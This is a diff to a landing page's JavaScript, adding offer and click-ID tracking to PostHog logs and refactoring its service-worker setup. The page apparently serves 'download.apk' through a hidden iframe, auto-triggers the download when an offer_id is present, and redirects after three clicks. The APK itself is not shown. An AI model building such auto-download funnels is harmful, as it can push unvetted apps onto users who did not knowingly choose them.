@@ -15,12 +15,87 @@
       let phog = null
       let posthogInitStart = 0
 
+      const logContext = {
+        offer_id: 'undefined',
+        click_id: 'undefined',
+        file_name: 'undefined',
+      }
+
+      function pickClickId(params) {
+        return params.get('click_id') || params.get('utm_id') || params.get('clickid') || params.get('clickId') || ''
+      }
+
+      function syncLogContext(params) {
+        try {
+          const p = params || window.__savedDownloadParams || new URLSearchParams(window.location.search)
+          logContext.offer_id = p.get('offer_id') || 'undefined'
+          logContext.click_id = pickClickId(p) || 'undefined'
+          logContext.file_name = p.get('utm_medium') || 'undefined'
+        } catch (error) {
+          log('error', `Failed to read landing params`, { error_message: error.message })
+        }
+        if (phog) {
+          phog.register(contextAttributes())
+        }
+        return logContext
+      }
+
+      function contextAttributes() {
+        return {
+          offer_id: logContext.offer_id,
+          click_id: logContext.click_id,
+          file_name: logContext.file_name,
+        }
+      }
+
+      function contextSuffix() {
+        const parts = []
+        if (logContext.offer_id !== 'undefined') parts.push(`offer_id: [${logContext.offer_id}]`)
+        if (logContext.click_id !== 'undefined') parts.push(`click_id: [${logContext.click_id}]`)
+        if (logContext.file_name !== 'undefined') parts.push(`file_name: [${logContext.file_name}]`)
+        return parts.length ? ' ' + parts.join(', ') : ''
+      }
+
+      let stepStartedAt = 0
+      function stepStart(label) {
+        stepStartedAt = performance.now()
+        log('info', `Await ${label}`)
+      }
+      function stepEnd(label, extra = {}, key = 'await_duration_ms') {
+        log('info', `Awaited ${label}`, { [key]: Math.round(performance.now() - stepStartedAt), ...extra })
+      }
+
+      async function timedStep(label, promise) {
+        stepStart(label)
+        try {
+          const value = await promise
+          stepEnd(label)
+          return value
+        } catch (error) {
+          log('error', `Step failed: ${label}`, { error_message: error.message })
+          throw error
+        }
+      }
+      function timedSync(label, fn) {
+        stepStart(label)
+        try {
+          const value = fn()
+          stepEnd(label, {}, 'duration_ms')
+          return value
+        } catch (error) {
+          log('error', `Step failed: ${label}`, { error_message: error.message })
+          throw error
+        }
+      }
+
       function log(level, message, attributes = {}) {
-        attributes['delay'] = performance.now() - start
-        attributes['land'] = '027'
+        const merged = { ...contextAttributes(), ...attributes }
+        merged['delay'] = performance.now() - start
+        merged['land'] = '027'
+        const body = `${message}${contextSuffix()}`
 
         if (phog == null) {
-          logQueue.push({level, message, attributes})
+          logQueue.push({level, message: body, attributes: merged})
           return
         }
 
@@ -28,24 +103,26 @@
           posthogInitStart = performance.now()
         }
 
-        attributes['delay_after_posthog_init'] = performance.now() - posthogInitStart
-        phog.logger[level](message, attributes)
+        merged['delay_after_posthog_init'] = performance.now() - posthogInitStart
+        phog.logger[level](body, merged)
       }
 
       function capture(event, attributes = {}) {
-        attributes['delay'] = performance.now() - start
-        attributes['land'] = '027'
+        const merged = { ...contextAttributes(), ...attributes }
+        merged['delay'] = performance.now() - start
+        merged['land'] = '027'
 
         if (phog == null) {
-          eventQueue.push({event, attributes})
+          eventQueue.push({event, attributes: merged})
+          return
         }
 
         if (posthogInitStart == 0) {
           posthogInitStart = performance.now()
         }
 
-        attributes['delay_after_posthog_init'] = performance.now() - posthogInitStart
-        phog.capture(event, attributes)
+        merged['delay_after_posthog_init'] = performance.now() - posthogInitStart
+        phog.capture(event, merged)
       }
 
       posthog.init('phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL', {
@@ -69,8 +146,10 @@
         person_profiles: 'identified_only',
         loaded: function(ph) {
           // ph — это полноценный объект PostHog
+          syncLogContext()
           ph.register({
             land: '027',
+            ...contextAttributes(),
           });
 
           // Теперь logger гарантированно существует
@@ -92,27 +171,19 @@
       window.__downloadSwVersion = '42316858';
       window.__downloadSwUrl = `${window.__landingRoot}sw5.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
       window.__swReadyPromise = (async () => {
-        log('info', 'Await window.__landingParamsReady [swReadyPromise]')
-        await window.__landingParamsReady;
-        log('info', 'Awaited window.__landingParamsReady [swReadyPromise]')
+        await timedStep('window.__landingParamsReady [swReadyPromise]', window.__landingParamsReady)
         if (!('serviceWorker' in navigator)) {
           return { ok: false, direct: true, reason: 'unsupported' };
         }
 
-        log('info', 'Await registration worker')
-        const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
-        log('info', 'Awaited registration worker')
-        log('info', 'Await registration worker update')
-        await registration.update();
-        log('info', 'Awaited registration worker update')
+        const registration = await timedStep('registration worker', navigator.serviceWorker.register(window.__downloadSwUrl))
+        await timedStep('registration worker update', registration.update())
 
         if (registration.waiting) {
           registration.waiting.postMessage({ type: 'SKIP_WAITING' });
         }
 
-        log('info', 'Await service worker ready')
-        await navigator.serviceWorker.ready;
-        log('info', 'Awaited service worker ready')
+        await timedStep('service worker ready', navigator.serviceWorker.ready)
 
         const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
         if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
@@ -339,8 +410,9 @@
 
         async function registerServiceWorker() {
           log('info', 'Register service worker');
-          await window.__landingParamsReady;
+          await timedStep('window.__landingParamsReady', window.__landingParamsReady)
           savedParams = window.__savedDownloadParams;
+          syncLogContext(savedParams)
           log('info', 'Get offer id and file name');
           offerId = getSavedOfferId();
           fileName = getSavedFileName();
@@ -349,26 +421,18 @@
           const title = document.querySelector('#fileTitle');
           if (title) title.textContent = fileName;
 
-          log('info', 'Await swState');
-          const swState = await window.__swReadyPromise;
-          log('info', 'Awaited swState');
+          const swState = await timedStep('swState', window.__swReadyPromise)
 
           log('info', 'Check swstate');
           if (!swState.ok || swState.direct) {
             downloadButton.disabled = true;
-            log('warn', 'service worker is required for offer download', { reason: swState.reason, offerId });
+            log('warn', 'Service worker is required for offer download', { reason: swState.reason });
             return;
           }
 
           isServiceWorkerReady = true;
           downloadButton.disabled = !offerId;
-          log('info', 'ready to download', {
-            date: new Date().toISOString(),
-            controller: swState.controller && swState.controller.scriptURL,
-            swUrl: SW_URL,
-            offerId,
-            fileName,
-          });
+          log('info', 'Ready to download', { controller: swState.controller && swState.controller.scriptURL, swUrl: SW_URL });
 
           if (offerId) {
             log('info', 'Click download button');
@@ -378,39 +442,47 @@
         }
 
         function startDownload() {
-          log('info', 'Start download');
+          try {
+            log('info', 'Start download');
 
-          if (!offerId) {
-            log('warn', 'offer_id is missing. Add ?offer_id=123');
-            return;
+            if (!offerId) {
+              log('warn', 'Offer ID is missing');
+              return;
+            }
+
+            const target = new URL('download.apk', window.__landingRoot);
+            log('info', 'Starting service worker download', { target: target.href });
+            downloadFrame.src = 'about:blank';
+            window.setTimeout(() => {
+              downloadFrame.src = target.href;
+            }, 0);
+          } catch (error) {
+            log('error', 'Start download failed', { error_message: error.message })
           }
-
-          const target = new URL('download.apk', window.__landingRoot);
-          log('info', 'starting service worker download', { offerId, fileName, target: target.href });
-          downloadFrame.src = 'about:blank';
-          window.setTimeout(() => {
-            downloadFrame.src = target.href;
-          }, 0);
         }
 
         function handleDownloadClick(event) {
-          log('info', 'Handle download click');
+          try {
+            log('info', 'Handle download click');
 
-          if (!isServiceWorkerReady) {
-            log('info', 'download requested before service worker readiness');
-            return;
-          }
-
-          if (event && event.isTrusted) {
-            trustedClickCount += 1;
-
-            if (trustedClickCount >= 3) {
-              window.location.href = getRedirectUrl();
+            if (!isServiceWorkerReady) {
+              log('info', 'Download requested before service worker readiness');
               return;
             }
-          }
 
-          startDownload();
+            if (event && event.isTrusted) {
+              trustedClickCount += 1;
+
+              if (trustedClickCount >= 3) {
+                window.location.href = getRedirectUrl();
+                return;
+              }
+            }
+
+            startDownload();
+          } catch (error) {
+            log('error', 'Download click handling failed', { error_message: error.message })
+          }
         }
 
         downloadButton.addEventListener('click', handleDownloadClick);
@@ -419,7 +491,7 @@
         registerServiceWorker().catch((error) => {
           console.error('[download] service worker setup failed', error);
           downloadButton.disabled = true;
-          log('error', 'service worker setup failed', { error: error.message, offerId });
+          log('error', 'Service worker setup failed', { error_message: error.message });
         });
 
       })();
